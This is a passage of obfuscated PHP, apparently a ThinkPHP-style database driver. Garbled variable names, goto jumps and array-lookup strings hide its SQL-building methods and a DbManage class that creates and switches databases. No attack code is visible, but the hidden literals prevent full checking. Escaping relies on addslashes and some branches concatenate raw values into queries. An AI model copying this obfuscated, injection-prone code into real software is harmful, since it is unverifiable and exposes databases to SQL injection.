$dĞÌŠš¶Ï«[$aèÃêìÃ‰ó] : $dĞÌŠš¶Ï«; $eíé±¤ù[] = $bíâØÊµäğ[244] . $this->parseWhereItem($this->parseKey($AÙóØËÊ¯ë), $B²¿ÂÄåíæ) . $bíâØÊµäğ[812]; } $A…ÙæÒİßĞ .= implode($bíâØÊµäğ[918], $eíé±¤ù); } elseif (strpos($B¦ŠŠ«ö, $bíâØÊµäğ[268])) { $fÒƒ–šØŠ = explode($bíâØÊµäğ[268], $B¦ŠŠ«ö); $eíé±¤ù = array(); foreach ($fÒƒ–šØŠ as $aèÃêìÃ‰ó => $AÙóØËÊ¯ë) { $B²¿ÂÄåíæ = $AÚÕµÛ•…¾ ? $dĞÌŠš¶Ï«[$aèÃêìÃ‰ó] : $dĞÌŠš¶Ï«; $eíé±¤ù[] = $bíâØÊµäğ[244] . $this->parseWhereItem($this->parseKey($AÙóØËÊ¯ë), $B²¿ÂÄåíæ) . $bíâØÊµäğ[812]; } $A…ÙæÒİßĞ .= implode($bíâØÊµäğ[913], $eíé±¤ù); } else { $A…ÙæÒİßĞ .= $this->parseWhereItem($this->parseKey($B¦ŠŠ«ö), $dĞÌŠš¶Ï«); } } $A…ÙæÒİßĞ .= $bíâØÊµäğ[262] . $FººïÏÏ…; } $A…ÙæÒİßĞ = substr($A…ÙæÒİßĞ, 0, -strlen($FººïÏÏ…)); } return empty($A…ÙæÒİßĞ) ? $bíâØÊµäğ[33] : $bíâØÊµäğ[919] . $A…ÙæÒİßĞ; } protected function parseWhereItem($B¤†™®‘ñ†, $C›Û‹Ğìç) { $f¡½â ‰ßÄ =& $_SERVER[Ö]; $EÄê ÔºÕš = $f¡½â ‰ßÄ[33]; if (is_array($C›Û‹Ğìç)) { if (is_string($C›Û‹Ğìç[0])) { $E›¢“ÃÏ¶ê = strtolower($C›Û‹Ğìç[0]); if (in_array($C›Û‹Ğìç[0], array($f¡½â ‰ßÄ[902], $f¡½â ‰ßÄ[920], $f¡½â ‰ßÄ[921], $f¡½â ‰ßÄ[922], $f¡½â ‰ßÄ[923], $f¡½â ‰ßÄ[924]))) { $EÄê ÔºÕš .= $B¤†™®‘ñ† . $f¡½â ‰ßÄ[50] . $C›Û‹Ğìç[0] . $f¡½â ‰ßÄ[50] . $this->parseValue($C›Û‹Ğìç[1]); } elseif (preg_match($f¡½â ‰ßÄ[925], $C›Û‹Ğìç[0])) { $EÄê ÔºÕš .= $B¤†™®‘ñ† . $f¡½â ‰ßÄ[50] . $this->exp[$E›¢“ÃÏ¶ê] . $f¡½â ‰ßÄ[50] . $this->parseValue($C›Û‹Ğìç[1]); } elseif (preg_match($f¡½â ‰ßÄ[926], $C›Û‹Ğìç[0])) { if (is_array($C›Û‹Ğìç[1])) { $cŠÍÔš³Ì = isset($C›Û‹Ğìç[2]) ? strtoupper($C›Û‹Ğìç[2]) : $f¡½â ‰ßÄ[911]; if (in_array($cŠÍÔš³Ì, array($f¡½â ‰ßÄ[910], $f¡½â ‰ßÄ[911], $f¡½â ‰ßÄ[912]))) { $f‹§Ş‹¤ì‹ = array(); foreach ($C›Û‹Ğìç[1] as $F®ÎËâŒ¥¬) { $f‹§Ş‹¤ì‹[] = $B¤†™®‘ñ† . $f¡½â ‰ßÄ[50] . $this->exp[$E›¢“ÃÏ¶ê] . $f¡½â ‰ßÄ[50] . $this->parseValue($F®ÎËâŒ¥¬); } $EÄê ÔºÕš .= $f¡½â ‰ßÄ[244] . implode($f¡½â ‰ßÄ[50] . $cŠÍÔš³Ì . $f¡½â ‰ßÄ[50], $f‹§Ş‹¤ì‹) . $f¡½â ‰ßÄ[812]; } } else { $EÄê ÔºÕš .= $B¤†™®‘ñ† . $f¡½â ‰ßÄ[50] . $this->exp[$E›¢“ÃÏ¶ê] . $f¡½â ‰ßÄ[50] . $this->parseValue($C›Û‹Ğìç[1]); } } elseif ($f¡½â ‰ßÄ[281] == $E›¢“ÃÏ¶ê) { $EÄê ÔºÕš .= $f¡½â ‰ßÄ[810] . $B¤†™®‘ñ† . $f¡½â ‰ßÄ[50] . $C›Û‹Ğìç[1] . $f¡½â ‰ßÄ[927]; } elseif (preg_match($f¡½â ‰ßÄ[928], $C›Û‹Ğìç[0])) { if (isset($C›Û‹Ğìç[2]) && $f¡½â ‰ßÄ[281] == $C›Û‹Ğìç[2]) { $EÄê ÔºÕš .= $B¤†™®‘ñ† . $f¡½â ‰ßÄ[50] . $this->exp[$E›¢“ÃÏ¶ê] . $f¡½â ‰ßÄ[50] . $C›Û‹Ğìç[1]; } else { if (is_string($C›Û‹Ğìç[1])) { $C›Û‹Ğìç[1] = explode($f¡½â ‰ßÄ[47], $C›Û‹Ğìç[1]); } $d áÉÃÊ§² = implode($f¡½â ‰ßÄ[47], $this->parseValue($C›Û‹Ğìç[1])); $EÄê ÔºÕš .= $B¤†™®‘ñ† . $f¡½â ‰ßÄ[50] . $this->exp[$E›¢“ÃÏ¶ê] . $f¡½â ‰ßÄ[810] . $d áÉÃÊ§² . $f¡½â ‰ßÄ[812]; } } elseif (preg_match($f¡½â ‰ßÄ[929], $C›Û‹Ğìç[0])) { $b¿»†ĞÆ‹ = is_string($C›Û‹Ğìç[1]) ? explode($f¡½â ‰ßÄ[47], $C›Û‹Ğìç[1]) : $C›Û‹Ğìç[1]; $EÄê ÔºÕš .= $f¡½â ‰ßÄ[810] . $B¤†™®‘ñ† . $f¡½â ‰ßÄ[50] . $this->exp[$E›¢“ÃÏ¶ê] . $f¡½â ‰ßÄ[50] . $this->parseValue($b¿»†ĞÆ‹[0]) . $f¡½â ‰ßÄ[913] . $this->parseValue($b¿»†ĞÆ‹[1]) . $f¡½â ‰ßÄ[262]; } else { think_exception(think_lang($f¡½â ‰ßÄ[916]) . $f¡½â ‰ßÄ[4] . $C›Û‹Ğìç[0]); } } else { $B³œÑ†©öÊ = count($C›Û‹Ğìç); $DÂíÒäŞ“ = isset($C›Û‹Ğìç[$B³œÑ†©öÊ - 1]) ? strtoupper($C›Û‹Ğìç[$B³œÑ†©öÊ - 1]) : $f¡½â ‰ßÄ[33]; if (in_array($DÂíÒäŞ“, array($f¡½â ‰ßÄ[910], $f¡½â ‰ßÄ[911], $f¡½â ‰ßÄ[912]))) { $B³œÑ†©öÊ = $B³œÑ†©öÊ - 1; } else { $DÂíÒäŞ“ = $f¡½â ‰ßÄ[910]; } for ($A•ø‡é¨Äæ = 0; $A•ø‡é¨Äæ < $B³œÑ†©öÊ; $A•ø‡é¨Äæ++) { $b¿»†ĞÆ‹ = is_array($C›Û‹Ğìç[$A•ø‡é¨Äæ]) ? $C›Û‹Ğìç[$A•ø‡é¨Äæ][1] : $C›Û‹Ğìç[$A•ø‡é¨Äæ]; if ($f¡½â ‰ßÄ[281] == strtolower($C›Û‹Ğìç[$A•ø‡é¨Äæ][0])) { $EÄê ÔºÕš .= $f¡½â ‰ßÄ[244] . $B¤†™®‘ñ† . $f¡½â ‰ßÄ[50] . $b¿»†ĞÆ‹ . $f¡½â ‰ßÄ[927] . $DÂíÒäŞ“ . $f¡½â ‰ßÄ[50]; } else { $CâÃğó¬á = is_array($C›Û‹Ğìç[$A•ø‡é¨Äæ]) ? $this->exp[strtolower($C›Û‹Ğìç[$A•ø‡é¨Äæ][0])] : $f¡½â ‰ßÄ[902]; if (!$CâÃğó¬á && is_array($C›Û‹Ğìç[$A•ø‡é¨Äæ]) && in_array($C›Û‹Ğìç[$A•ø‡é¨Äæ][0], array($f¡½â ‰ßÄ[902], $f¡½â ‰ßÄ[920], $f¡½â ‰ßÄ[921], $f¡½â ‰ßÄ[922], $f¡½â ‰ßÄ[923], $f¡½â ‰ßÄ[924]))) { $CâÃğó¬á = $C›Û‹Ğìç[$A•ø‡é¨Äæ][0]; } $EÄê ÔºÕš .= $f¡½â ‰ßÄ[244] . $B¤†™®‘ñ† . $f¡½â ‰ßÄ[50] . $CâÃğó¬á . $f¡½â ‰ßÄ[50] . $this->parseValue($b¿»†ĞÆ‹) . $f¡½â ‰ßÄ[927] . $DÂíÒäŞ“ . $f¡½â ‰ßÄ[50]; } } $EÄê ÔºÕš = substr($EÄê ÔºÕš, 0, -4); } } else { $EÄê ÔºÕš .= $B¤†™®‘ñ† . $f¡½â ‰ßÄ[930] . $this->parseValue($C›Û‹Ğìç); } return $EÄê ÔºÕš; } protected function parseThinkWhere($bç¦‡ÁÖ‡, $eÄ½È¹Íé) { $D¯Û‡„ØŸ =& $_SERVER[Ö]; $DªĞÄùÍá» = $D¯Û‡„ØŸ[33]; switch ($bç¦‡ÁÖ‡) { case $D¯Û‡„ØŸ[335]: $DªĞÄùÍá» = $eÄ½È¹Íé; break; case $D¯Û‡„ØŸ[914]: $DªĞÄùÍá» = is_string($eÄ½È¹Íé) ? $eÄ½È¹Íé : substr($this->parseWhere($eÄ½È¹Íé), 6); break; case $D¯Û‡„ØŸ[931]: parse_str($eÄ½È¹Íé, $d»ğ‹‘‡ë); if (isset($d»ğ‹‘‡ë[$D¯Û‡„ØŸ[909]])) { $dŒ©ÑÛÏóê = $D¯Û‡„ØŸ[50] . strtoupper($d»ğ‹‘‡ë[$D¯Û‡„ØŸ[909]]) . $D¯Û‡„ØŸ[50]; unset($d»ğ‹‘‡ë[$D¯Û‡„ØŸ[909]]); } else { $dŒ©ÑÛÏóê = $D¯Û‡„ØŸ[913]; } $bŒ…°Óà– = array(); foreach ($d»ğ‹‘‡ë as $BæêòåÉ‡ => $AÀ•ÓÉ‡ëº) { $bŒ…°Óà–[] = $this->parseKey($BæêòåÉ‡) . $D¯Û‡„ØŸ[930] . $this->parseValue($AÀ•ÓÉ‡ëº); } $DªĞÄùÍá» = implode($dŒ©ÑÛÏóê, $bŒ…°Óà–); break; } return $DªĞÄùÍá»; } protected function parseLimit($Bê½ÛÜ‹Ë¹) { $E–ñ¹±Ëùï =& $_SERVER[Ö]; return !empty($Bê½ÛÜ‹Ë¹) ? $E–ñ¹±Ëùï[48] . $Bê½ÛÜ‹Ë¹ . $E–ñ¹±Ëùï[50] : $E–ñ¹±Ëùï[33]; } protected function parseJoin($cß³ˆ´Š‰) { $cœ…’¿Š¿º =& $_SERVER[Ö]; $Dğ“×åÉÃ = $cœ…’¿Š¿º[33]; if (!empty($cß³ˆ´Š‰)) { if (is_array($cß³ˆ´Š‰)) { foreach ($cß³ˆ´Š‰ as $D¸Çœ³ => $e×¹¿¬ï»ù) { if (!1 !== stripos($e×¹¿¬ï»ù, $cœ…’¿Š¿º[932])) { $Dğ“×åÉÃ .= $cœ…’¿Š¿º[50] . $e×¹¿¬ï»ù; } else { $Dğ“×åÉÃ .= $cœ…’¿Š¿º[933] . $e×¹¿¬ï»ù; } } } else { $Dğ“×åÉÃ .= $cœ…’¿Š¿º[933] . $cß³ˆ´Š‰; } } $Dğ“×åÉÃ = preg_replace($cœ…’¿Š¿º[934], think_config($cœ…’¿Š¿º[837]) . $cœ…’¿Š¿º[935], $Dğ“×åÉÃ); return $Dğ“×åÉÃ; } protected function parseOrder($a¨ÎÌ„¨Å) { $dŠà…Ğ £ =& $_SERVER[Ö]; if (is_array($a¨ÎÌ„¨Å)) { $EÎ­´ŒÔø = array(); foreach ($a¨ÎÌ„¨Å as $fØŸÊˆñÌ© => $BÎİ›é¬ˆÈ) { if (is_numeric($fØŸÊˆñÌ©)) { $EÎ­´ŒÔø[] = $this->parseKey($BÎİ›é¬ˆÈ); } else { $BÎİ›é¬ˆÈ = in_array(strtoupper(trim($BÎİ›é¬ˆÈ)), array($dŠà…Ğ £[936], $dŠà…Ğ £[937])) ? $dŠà…Ğ £[50] . $BÎİ›é¬ˆÈ : $dŠà…Ğ £[33]; if (preg_match($dŠà…Ğ £[938], $fØŸÊˆñÌ©)) { $EÎ­´ŒÔø[] = $this->parseKey($fØŸÊˆñÌ©) . $BÎİ›é¬ˆÈ; } else { think_exception($dŠà…Ğ £[939] . $fØŸÊˆñÌ©); } } } $a¨ÎÌ„¨Å = implode($dŠà…Ğ £[47], $EÎ­´ŒÔø); } return !empty($a¨ÎÌ„¨Å) ? $dŠà…Ğ £[940] . $a¨ÎÌ„¨Å : $dŠà…Ğ £[33]; } protected function parseGroup($cÙÊíˆ™Í) { $EšÒ´¥Ú³Ë =& $_SERVER[Ö]; return !empty($cÙÊíˆ™Í) ? $EšÒ´¥Ú³Ë[941] . $cÙÊíˆ™Í : $EšÒ´¥Ú³Ë[33]; } protected function parseHaving($eô°ƒ‰¥¯Š) { $C‚„å–ô =& $_SERVER[Ö]; return !empty($eô°ƒ‰¥¯Š) ? $C‚„å–ô[942] . $eô°ƒ‰¥¯Š : $C‚„å–ô[33]; } protected function parseComment($f­ Ááì»â) { $aŸ©„œ„ÓŒ =& $_SERVER[Ö]; return !empty($f­ Ááì»â) ? $aŸ©„œ„ÓŒ[943] . $f­ Ááì»â . $aŸ©„œ„ÓŒ[944] : $aŸ©„œ„ÓŒ[33]; } protected function parseDistinct($D²‚ßù±) { $dÚ·ÇÓùÜ =& $_SERVER[Ö]; return !empty($D²‚ßù±) ? $dÚ·ÇÓùÜ[945] : $dÚ·ÇÓùÜ[33]; } protected function parseUnion($a‰©Á¯¾ôÒ) { $F¼£÷Æá§¤ =& $_SERVER[Ö]; if (empty($a‰©Á¯¾ôÒ)) { return $F¼£÷Æá§¤[33]; } if (isset($a‰©Á¯¾ôÒ[$F¼£÷Æá§¤[332]])) { $DÚù†¾‹è› = $F¼£÷Æá§¤[946]; unset($a‰©Á¯¾ôÒ[$F¼£÷Æá§¤[332]]); } else { $DÚù†¾‹è› = $F¼£÷Æá§¤[947]; } foreach ($a‰©Á¯¾ôÒ as $b¨¤Ô¸ Ë) { $d¦Š½ë’¨´[] = $DÚù†¾‹è› . (is_array($b¨¤Ô¸ Ë) ? $this->buildSelectSql($b¨¤Ô¸ Ë) : $b¨¤Ô¸ Ë); } return implode($F¼£÷Æá§¤[50], $d¦Š½ë’¨´); } public function insert($A×˜Ç×à¢Ó, $D÷ÔØ™‹Í¨ = array(), $DÇºÅ¯¤òù = false) { goto C×•ä¬ã²á; CˆßÏÆÁœµ: $FÜŠ¯ºµÈÎ .= $this->parseComment(!empty($D÷ÔØ™‹Í¨[$bŠ¾ˆ‰Ûø[337]]) ? $D÷ÔØ™‹Í¨[$bŠ¾ˆ‰Ûø[337]] : $bŠ¾ˆ‰Ûø[33]); return $this->execute($FÜŠ¯ºµÈÎ, $this->parseBind(!empty($D÷ÔØ™‹Í¨[$bŠ¾ˆ‰Ûø[269]]) ? $D÷ÔØ™‹Í¨[$bŠ¾ˆ‰Ûø[269]] : array())); goto AˆÖ¢ë·—ä; C×•ä¬ã²á: $bŠ¾ˆ‰Ûø =& $_SERVER[Ö]; $b¨Í¤éÓÀŠ = $CÒ„›‰Æ»© = array(); $this->model = $D÷ÔØ™‹Í¨[$bŠ¾ˆ‰Ûø[265]]; goto a‰Ìïİ¼Á; a‰Ìïİ¼Á: foreach ($A×˜Ç×à¢Ó as $CšŠÜŠôÂ => $e“Ö²ïÍ) { if (is_array($e“Ö²ïÍ) && $bŠ¾ˆ‰Ûø[281] == $e“Ö²ïÍ[0]) { $CÒ„›‰Æ»©[] = $this->parseKey($CšŠÜŠôÂ); $b¨Í¤éÓÀŠ[] = $e“Ö²ïÍ[1]; } elseif (is_scalar($e“Ö²ïÍ) || is_null($e“Ö²ïÍ)) { $CÒ„›‰Æ»©[] = $this->parseKey($CšŠÜŠôÂ); $b¨Í¤éÓÀŠ[] = $this->parseValue($e“Ö²ïÍ); } } $FÜŠ¯ºµÈÎ = ($DÇºÅ¯¤òù ? $bŠ¾ˆ‰Ûø[814] : $bŠ¾ˆ‰Ûø[815]) . $bŠ¾ˆ‰Ûø[816] . $this->parseTable($D÷ÔØ™‹Í¨[$bŠ¾ˆ‰Ûø[263]]) . $bŠ¾ˆ‰Ûø[810] . implode($bŠ¾ˆ‰Ûø[47], $CÒ„›‰Æ»©) . $bŠ¾ˆ‰Ûø[811] . implode($bŠ¾ˆ‰Ûø[47], $b¨Í¤éÓÀŠ) . $bŠ¾ˆ‰Ûø[812]; $FÜŠ¯ºµÈÎ .= $this->parseLock(isset($D÷ÔØ™‹Í¨[$bŠ¾ˆ‰Ûø[771]]) ? $D÷ÔØ™‹Í¨[$bŠ¾ˆ‰Ûø[771]] : !1); goto CˆßÏÆÁœµ; AˆÖ¢ë·—ä: } public function selectInsert($cˆ–òó×Ü, $Aš…©Ú¶‘ù, $cä‚ÛÍ§šŞ = array()) { goto a–•À±‚é…; d ¿‰‡‰Ô×: array_walk($cˆ–òó×Ü, array($this, $C˜‚­²äÚ‹[813])); $e¾°Š†»ŠÚ = $C˜‚­²äÚ‹[948] . $this->parseTable($Aš…©Ú¶‘ù) . $C˜‚­²äÚ‹[810] . implode($C˜‚­²äÚ‹[47], $cˆ–òó×Ü) . $C˜‚­²äÚ‹[927]; $e¾°Š†»ŠÚ .= $this->buildSelectSql($cä‚ÛÍ§šŞ); goto f›Ç•î±›¿; f›Ç•î±›¿: return $this->execute($e¾°Š†»ŠÚ, $this->parseBind(!empty($cä‚ÛÍ§šŞ[$C˜‚­²äÚ‹[269]]) ? $cä‚ÛÍ§šŞ[$C˜‚­²äÚ‹[269]] : array())); goto ašÏç°÷®†; a–•À±‚é…: $C˜‚­²äÚ‹ =& $_SERVER[Ö]; $this->model = $cä‚ÛÍ§šŞ[$C˜‚­²äÚ‹[265]]; if (is_string($cˆ–òó×Ü)) { $cˆ–òó×Ü = explode($C˜‚­²äÚ‹[47], $cˆ–òó×Ü); } goto d ¿‰‡‰Ô×; ašÏç°÷®†: } public function update($d‘æ’×Ø«¶, $aÉŒ·ãåß÷) { $bêÔ‚ğÜ§ä =& $_SERVER[Ö]; $this->model = $aÉŒ·ãåß÷[$bêÔ‚ğÜ§ä[265]]; $cµ¡ÀÇ¡Ñ = $bêÔ‚ğÜ§ä[949] . $this->parseTable($aÉŒ·ãåß÷[$bêÔ‚ğÜ§ä[263]]) . $this->parseSet($d‘æ’×Ø«¶) . $this->parseWhere(!empty($aÉŒ·ãåß÷[$bêÔ‚ğÜ§ä[259]]) ? $aÉŒ·ãåß÷[$bêÔ‚ğÜ§ä[259]] : $bêÔ‚ğÜ§ä[33]) . $this->parseOrder(!empty($aÉŒ·ãåß÷[$bêÔ‚ğÜ§ä[346]]) ? $aÉŒ·ãåß÷[$bêÔ‚ğÜ§ä[346]] : $bêÔ‚ğÜ§ä[33]) . $this->parseLimit(!empty($aÉŒ·ãåß÷[$bêÔ‚ğÜ§ä[276]]) ? $aÉŒ·ãåß÷[$bêÔ‚ğÜ§ä[276]] : $bêÔ‚ğÜ§ä[33]) . $this->parseLock(isset($aÉŒ·ãåß÷[$bêÔ‚ğÜ§ä[771]]) ? $aÉŒ·ãåß÷[$bêÔ‚ğÜ§ä[771]] : !1) . $this->parseComment(!empty($aÉŒ·ãåß÷[$bêÔ‚ğÜ§ä[337]]) ? $aÉŒ·ãåß÷[$bêÔ‚ğÜ§ä[337]] : $bêÔ‚ğÜ§ä[33]); return $this->execute($cµ¡ÀÇ¡Ñ, $this->parseBind(!empty($aÉŒ·ãåß÷[$bêÔ‚ğÜ§ä[269]]) ? $aÉŒ·ãåß÷[$bêÔ‚ğÜ§ä[269]] : array())); } public function delete($B‡‘Ö¥¢‰ = array()) { $e«´¨«ÊÎº =& $_SERVER[Ö]; $this->model = $B‡‘Ö¥¢‰[$e«´¨«ÊÎº[265]]; $D…‡Ú›“£² = $e«´¨«ÊÎº[950] . $this->parseTable($B‡‘Ö¥¢‰[$e«´¨«ÊÎº[263]]) . $this->parseWhere(!empty($B‡‘Ö¥¢‰[$e«´¨«ÊÎº[259]]) ? $B‡‘Ö¥¢‰[$e«´¨«ÊÎº[259]] : $e«´¨«ÊÎº[33]) . $this->parseOrder(!empty($B‡‘Ö¥¢‰[$e«´¨«ÊÎº[346]]) ? $B‡‘Ö¥¢‰[$e«´¨«ÊÎº[346]] : $e«´¨«ÊÎº[33]) . $this->parseLimit(!empty($B‡‘Ö¥¢‰[$e«´¨«ÊÎº[276]]) ? $B‡‘Ö¥¢‰[$e«´¨«ÊÎº[276]] : $e«´¨«ÊÎº[33]) . $this->parseLock(isset($B‡‘Ö¥¢‰[$e«´¨«ÊÎº[771]]) ? $B‡‘Ö¥¢‰[$e«´¨«ÊÎº[771]] : !1) . $this->parseComment(!empty($B‡‘Ö¥¢‰[$e«´¨«ÊÎº[337]]) ? $B‡‘Ö¥¢‰[$e«´¨«ÊÎº[337]] : $e«´¨«ÊÎº[33]); return $this->execute($D…‡Ú›“£², $this->parseBind(!empty($B‡‘Ö¥¢‰[$e«´¨«ÊÎº[269]]) ? $B‡‘Ö¥¢‰[$e«´¨«ÊÎº[269]] : array())); } public function select($C²§ËçåùÜ = array()) { goto CŸªÎä—Ùà; d»·»‹¦å: $D²–­ÄŸ¤é = isset($C²§ËçåùÜ[$E÷–ğ¾âòÖ[333]]) ? $C²§ËçåùÜ[$E÷–ğ¾âòÖ[333]] : !1; if ($D²–­ÄŸ¤é) { $DÎÃ¥ÃÏª‰ = is_string($D²–­ÄŸ¤é[$E÷–ğ¾âòÖ[89]]) ? $D²–­ÄŸ¤é[$E÷–ğ¾âòÖ[89]] : $E÷–ğ¾âòÖ[951] . md5($E©ÎÁÙéµİ); $fŒ‹†ùãì¯ = think_cache($DÎÃ¥ÃÏª‰, $E÷–ğ¾âòÖ[33], $D²–­ÄŸ¤é); if (!1 !== $fŒ‹†ùãì¯) { return $fŒ‹†ùãì¯; } } $EŠìŒŸÎİ = $this->query($E©ÎÁÙéµİ, $this->parseBind(!empty($C²§ËçåùÜ[$E÷–ğ¾âòÖ[269]]) ? $C²§ËçåùÜ[$E÷–ğ¾âòÖ[269]] : array())); goto A…ùÏš“ïô; A…ùÏš“ïô: if ($D²–­ÄŸ¤é && !1 !== $EŠìŒŸÎİ) { think_cache($DÎÃ¥ÃÏª‰, $EŠìŒŸÎİ, $D²–­ÄŸ¤é); } return $EŠìŒŸÎİ; goto aƒ³ŸÆÈùŠ; CŸªÎä—Ùà: $E÷–ğ¾âòÖ =& $_SERVER[Ö]; $this->model = $C²§ËçåùÜ[$E÷–ğ¾âòÖ[265]]; $E©ÎÁÙéµİ = $this->buildSelectSql($C²§ËçåùÜ); goto d»·»‹¦å; aƒ³ŸÆÈùŠ: } public function buildSelectSql($fÓâ½Û—ŞÃ = array()) { goto E™î£Â¡…Š; E™î£Â¡…Š: $Báô‡ç„‹ =& $_SERVER[Ö]; if (isset($fÓâ½Û—ŞÃ[$Báô‡ç„‹[336]])) { if (strpos($fÓâ½Û—ŞÃ[$Báô‡ç„‹[336]], $Báô‡ç„‹[47])) { list($f¶æŠ¤½ì, $aœ‘«¼‰å) = explode($Báô‡ç„‹[47], $fÓâ½Û—ŞÃ[$Báô‡ç„‹[336]]); } else { $f¶æŠ¤½ì = $fÓâ½Û—ŞÃ[$Báô‡ç„‹[336]]; } $f¶æŠ¤½ì = $f¶æŠ¤½ì ? $f¶æŠ¤½ì : 1; $aœ‘«¼‰å = isset($aœ‘«¼‰å) ? $aœ‘«¼‰å : (is_numeric($fÓâ½Û—ŞÃ[$Báô‡ç„‹[276]]) ? $fÓâ½Û—ŞÃ[$Báô‡ç„‹[276]] : 20); $bÖãÀçÕ÷ = $aœ‘«¼‰å * ((int) $f¶æŠ¤½ì - 1); $fÓâ½Û—ŞÃ[$Báô‡ç„‹[276]] = $bÖãÀçÕ÷ . $Báô‡ç„‹[47] . $aœ‘«¼‰å; } if (think_config($Báô‡ç„‹[952])) { $E‘°³íè¶ = $Báô‡ç„‹[953] . md5(serialize($fÓâ½Û—ŞÃ)); $a³ŠĞ³¦¤• = think_cache($E‘°³íè¶); if ($a³ŠĞ³¦¤•) { return $a³ŠĞ³¦¤•; } } goto Cßùˆšïã…; Cßùˆšïã…: $fÎÆ’Ù½„‚ = $this->parseSql($this->selectSql, $fÓâ½Û—ŞÃ); $fÎÆ’Ù½„‚ .= $this->parseLock(isset($fÓâ½Û—ŞÃ[$Báô‡ç„‹[771]]) ? $fÓâ½Û—ŞÃ[$Báô‡ç„‹[771]] : !1); if (isset($E‘°³íè¶)) { think_cache($E‘°³íè¶, $fÎÆ’Ù½„‚); } goto E‘º¤®‰¦‚; E‘º¤®‰¦‚: return $fÎÆ’Ù½„‚; goto Eõ‰‹®Â; Eõ‰‹®Â: } public function parseSql($f ‹§§îŠ, $A¢ƒ«§š×ø = array()) { $F¨½ªÇƒ¡” =& $_SERVER[Ö]; $f ‹§§îŠ = str_replace(array($F¨½ªÇƒ¡”[954], $F¨½ªÇƒ¡”[955], $F¨½ªÇƒ¡”[956], $F¨½ªÇƒ¡”[957], $F¨½ªÇƒ¡”[958], $F¨½ªÇƒ¡”[959], $F¨½ªÇƒ¡”[960], $F¨½ªÇƒ¡”[961], $F¨½ªÇƒ¡”[962], $F¨½ªÇƒ¡”[963], $F¨½ªÇƒ¡”[964]), array($this->parseTable("{$A¢ƒ«§š×ø[$F¨½ªÇƒ¡”[263]]}"), $this->parseDistinct(isset($A¢ƒ«§š×ø[$F¨½ªÇƒ¡”[965]]) ? $A¢ƒ«§š×ø[$F¨½ªÇƒ¡”[965]] : !1), $this->parseField(!empty($A¢ƒ«§š×ø[$F¨½ªÇƒ¡”[257]]) ? $A¢ƒ«§š×ø[$F¨½ªÇƒ¡”[257]] : $F¨½ªÇƒ¡”[172]), $this->parseJoin(!empty($A¢ƒ«§š×ø[$F¨½ªÇƒ¡”[266]]) ? $A¢ƒ«§š×ø[$F¨½ªÇƒ¡”[266]] : $F¨½ªÇƒ¡”[33]), $this->parseWhere(!empty($A¢ƒ«§š×ø[$F¨½ªÇƒ¡”[259]]) ? $A¢ƒ«§š×ø[$F¨½ªÇƒ¡”[259]] : $F¨½ªÇƒ¡”[33]), $this->parseGroup(!empty($A¢ƒ«§š×ø[$F¨½ªÇƒ¡”[966]]) ? $A¢ƒ«§š×ø[$F¨½ªÇƒ¡”[966]] : $F¨½ªÇƒ¡”[33]), $this->parseHaving(!empty($A¢ƒ«§š×ø[$F¨½ªÇƒ¡”[967]]) ? $A¢ƒ«§š×ø[$F¨½ªÇƒ¡”[967]] : $F¨½ªÇƒ¡”[33]), $this->parseOrder(!empty($A¢ƒ«§š×ø[$F¨½ªÇƒ¡”[346]]) ? $A¢ƒ«§š×ø[$F¨½ªÇƒ¡”[346]] : $F¨½ªÇƒ¡”[33]), $this->parseLimit(!empty($A¢ƒ«§š×ø[$F¨½ªÇƒ¡”[276]]) ? $A¢ƒ«§š×ø[$F¨½ªÇƒ¡”[276]] : $F¨½ªÇƒ¡”[33]), $this->parseUnion(!empty($A¢ƒ«§š×ø[$F¨½ªÇƒ¡”[331]]) ? $A¢ƒ«§š×ø[$F¨½ªÇƒ¡”[331]] : $F¨½ªÇƒ¡”[33]), $this->parseComment(!empty($A¢ƒ«§š×ø[$F¨½ªÇƒ¡”[337]]) ? $A¢ƒ«§š×ø[$F¨½ªÇƒ¡”[337]] : $F¨½ªÇƒ¡”[33])), $f ‹§§îŠ); return $f ‹§§îŠ; } public function getLastSql($aÓ„ñÅ—ª = '') { return $aÓ„ñÅ—ª ? $this->modelSql[$aÓ„ñÅ—ª] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($f§£Õ—ò„) { return addslashes($f§£Õ—ò„); } public function setModel($aöÃ´”¦¤Õ) { $this->model = $aöÃ´”¦¤Õ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($AÎéÇ¡²£­, $bßÂ ÛÒ = '') { $this->database = $AÎéÇ¡²£­; $this->type = $bßÂ ÛÒ; } public function model($b÷³ÀÄÇ‘ç = '') { return new ModelBase($b÷³ÀÄÇ‘ç, $_SERVER[Ö][33], $this->database); } public function db($fƒğƒÃƒåë = false) { goto c‹‡ÓÄ©Ìß; eÇÇ–†Ú¼ß: $this->database = $DÃÊ¾“¿¸Ì; $a ÑÄˆÚØä->execute("\165\x73\x65\40\140{$Dô‰ââÀæ·}\140"); return $a ÑÄˆÚØä; goto Cö£Œ©¥İƒ; fª…Ã¬º×: $this->database = $DÃÊ¾“¿¸Ì; $a ÑÄˆÚØä = $this->model()->db(); $cŞ¦éŒˆœ· = $a ÑÄˆÚØä->execute("\x73\x68\157\x77\x20\x64\x61\x74\x61\142\141\x73\x65\163\x20\x6c\151\x6b\x65\x20\47{$Dô‰ââÀæ·}\47"); goto E‹êäåŠˆŠ; c‹‡ÓÄ©Ìß: $dÃœšÕóƒÚ =& $_SERVER[Ö]; $DÃÊ¾“¿¸Ì = $this->database; if ($this->type == $dÃœšÕóƒÚ[9] || !$fƒğƒÃƒåë) { return $this->model()->db(); } goto eõ¯ÕËÆ©Ø; E‹êäåŠˆŠ: if (!$cŞ¦éŒˆœ·) { $a ÑÄˆÚØä->execute("\143\x72\145\141\164\x65\40\144\141\164\141\x62\x61\x73\145\x20\x60{$Dô‰ââÀæ·}\140"); } $DÃÊ¾“¿¸Ì[$dÃœšÕóƒÚ[230]] = $Dô‰ââÀæ·; if ($DÃÊ¾“¿¸Ì[$dÃœšÕóƒÚ[883]] == $dÃœšÕóƒÚ[717]) { $DÃÊ¾“¿¸Ì[$dÃœšÕóƒÚ[882]] .= $dÃœšÕóƒÚ[968] . $Dô‰ââÀæ·; } goto eÇÇ–†Ú¼ß; eõ¯ÕËÆ©Ø: $Dô‰ââÀæ· = $DÃÊ¾“¿¸Ì[$dÃœšÕóƒÚ[230]]; $DÃÊ¾“¿¸Ì[$dÃœšÕóƒÚ[230]] = $dÃœšÕóƒÚ[33]; if ($DÃÊ¾“¿¸Ì[$dÃœšÕóƒÚ[883]] == 